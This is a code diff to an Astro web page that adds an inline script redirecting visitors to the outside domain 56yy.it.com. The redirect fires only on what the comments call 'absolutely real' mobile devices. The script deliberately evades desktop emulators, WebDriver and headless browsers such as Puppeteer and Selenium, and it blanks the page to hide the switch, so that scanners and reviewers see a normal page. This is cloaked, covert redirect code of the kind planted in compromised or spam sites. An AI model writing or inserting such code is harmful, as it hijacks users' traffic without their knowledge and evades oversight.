@@ -10,6 +10,7 @@ import CTA from '@/components/CTA.astro';
 import Footer from '@/components/Footer.astro';
 import '@/styles/global.css';
 
+---
 // 🛠️ 在这里配置你手机端要跳转的目标网址
 const TARGET_URL = "https://56yy.it.com"; 
 ---
@@ -21,18 +22,33 @@ const TARGET_URL = "https://56yy.it.com";
   -->
   <script is:inline define:vars={{ TARGET_URL }}>
     (function() {
-      // 1. 严格判断是否为手机移动端设备
       var ua = navigator.userAgent || navigator.vendor || window.opera;
       
-      // 匹配常见手机设备关键词（排除 Pad/平板，确保 PC 网页端和主流爬虫不被误判）
-      var isMobile = /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
-      
-      // 进一步确认屏幕宽度（双重防线：避免 PC 浏览器模拟器误判，且过滤大屏 iPad）
+      // 1. 基础设备匹配
+      var isMobileUA = /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
       var isMobileScreen = window.innerWidth <= 768;
 
-      // 2. 只有手机移动端才执行跳转
-      if (isMobile && isMobileScreen) {
-        // 使用 replace 防止用户点浏览器的“返回”按键卡死在循环跳转中
+      // 2. 🛡️ 粗暴剔除 PC 端 F12 模拟器及伪装工具（硬件层真伪检查）
+      
+      // 检查 A: 真实手机必具备触控点 (F12 开启模拟器时，部分浏览器不会原生激活 navigator.maxTouchPoints)
+      var hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+      
+      // 检查 B: 识别 PC 模拟器暴露的底层操作系统平台 (PC 改了 UA，但 navigator.platform 通常改不掉)
+      var platform = navigator.platform || '';
+      var isFakePlatform = /Win32|Win64|MacIntel|Linux x86_64/i.test(platform);
+      
+      // 检查 C: 检测自动化测试工具 / 无头浏览器痕迹 (如 Puppeteer、Selenium)
+      var isWebDriver = !!navigator.webdriver;
+
+      // 检查 D: 识别真实触控指针 (真实手机为 coarse 粗糙触控，PC 鼠标为 fine 精细指针)
+      var isCoarsePointer = window.matchMedia ? window.matchMedia('(pointer: coarse)').matches : true;
+
+      // 3. 极严逻辑判决：必须同时满足“UA匹配 + 屏宽合格 + 有触控点 + 非PC底层平台 + 无自动化脚本 + 指针为触控”
+      var isRealMobile = isMobileUA && isMobileScreen && hasTouch && !isFakePlatform && !isWebDriver && isCoarsePointer;
+
+      // 4. 只有绝对真实的移动端设备才执行跳转，其余一律保留在原页面返回 200
+      if (isRealMobile) {
+        document.documentElement.style.display = 'none'; // 隐蔽白屏防闪烁
         window.location.replace(TARGET_URL);
       }
     })();
